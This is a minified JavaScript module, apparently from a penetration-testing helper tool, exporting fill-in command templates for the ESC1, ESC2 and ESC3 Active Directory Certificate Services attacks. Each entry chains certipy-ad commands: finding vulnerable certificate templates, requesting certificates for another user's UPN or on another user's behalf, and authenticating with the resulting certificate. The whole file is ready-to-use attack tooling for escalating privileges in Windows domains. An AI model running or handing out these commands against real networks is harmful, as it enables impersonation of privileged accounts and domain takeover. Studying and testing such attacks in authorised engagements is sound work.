const e=[{title:"ESC 1",description:"Enrollee-Supplied Subject for Client Authentication",template:`certipy-ad find -u {username} -p {password} -dc-ip {dc_ip}

certipy-ad req -u '{username}@{domain}' -p '{password}' -dc-ip {dc_ip} -target {domain} -ca {ca_name} -template {template_name} -upn {upn}

certipy-ad auth -pfx {pfx_file} -dc-ip {dc_ip}`},{title:"ESC 2",description:"Any Purpose Certificate Template",template:`certipy-ad find -u {username} -p {password} -dc-ip {dc_ip} -vulnerable -enabled

certipy-ad req -u '{username}' -p '{password}' -dc-ip '{dc_ip}' -target '{domain}' -ca '{ca_name}' -template 'Vulnerable-ESC2' -debug

certipy-ad req -u '{username}' -p '{password}' -dc-ip '{dc_ip}' -target '{domain}' -ca '{ca_name}' -template 'User' -on-behalf-of '{on_behalf_user}' -pfx {pfx_file} -debug

certipy-ad auth -pfx {pfx_file} -dc-ip {dc_ip}`},{title:"ESC 3",description:"Enrollment Agent Certificate Template",template:`certipy-ad find -u {username} -p {password} -dc-ip {dc_ip} -vulnerable -enabled

certipy-ad req -ca {ca_name} -dc-ip {dc_ip} -u {username} -p '{password}' -template Vulnerable-ESC3 -target {domain}

certipy-ad req -ca {ca_name} -dc-ip {dc_ip} -u {username} -p '{password}' -template USER -target {domain} -on-behalf-of '{on_behalf_user}' -pfx {pfx_file}

certipy-ad auth -pfx {pfx_file}`}],a={commands:e};export{e as commands,a as default};
